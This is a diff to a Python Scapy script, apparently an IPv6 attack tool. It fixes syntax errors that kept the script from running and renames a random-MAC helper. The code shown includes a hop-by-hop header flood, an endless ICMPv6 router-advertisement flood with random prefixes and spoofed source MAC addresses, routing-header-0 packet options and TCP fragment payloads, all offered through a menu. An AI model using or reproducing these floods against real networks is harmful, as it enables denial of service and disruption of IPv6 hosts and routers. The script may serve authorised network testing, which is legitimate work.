@@ -25,14 +25,13 @@
 
 
 import sys
-import random
 from random import randint
+
 try: from scapy.all import *
-except print "[!] Scapy Error: Libraries not availble.  Is Scapy installed?"; sys.exit(0)
+except: print "[!] Scapy Error: Libraries not availble.  Is Scapy installed?"; sys.exit(0)
 
-def randomacaddr():
+def randmacaddr():
     return ':'.join(map(lambda x: "%02x" % x, [ 0x00, 0x16, 0x3e,randint(0x00, 0x7f),randint(0x00, 0xff),randint(0x00, 0xff) ]))
-
 
 def hbh_flood(psrc = '::1', pdst = '::1', psport = 1055, pdport = 53, ppayload = 'x'*100, pnumpkts = 1000):
     #Send defaults above unless entered by user
@@ -88,10 +87,9 @@ def kill_ra():
     return()
 
 def flood_ra():
-    pkt = Ether()/IPv6()/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix= RandIP6("2001:CAFE:*::"),prefixlen=64) \
-    /ICMPv6NDOptSrcLLAddr(lladdr=randomacaddr())
+    pkt = Ether()/IPv6()/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix= RandIP6("2001:CAFE:*::"),prefixlen=64)/ICMPv6NDOptSrcLLAddr(lladdr = randmacaddr() )
     sendp(pkt,loop=1)
-    #return()
+
 
 def tcp_fragment():
     ### Create Payloads
@@ -123,7 +121,7 @@ def tcp_fragment():
     send(pkt2)
     return()
 
-def main();
+def main():
     print('1. Send HbH Header Flood')
     print('2. Send RH0 Packets')
     print('3. Send Packets with two RH0 Headers')
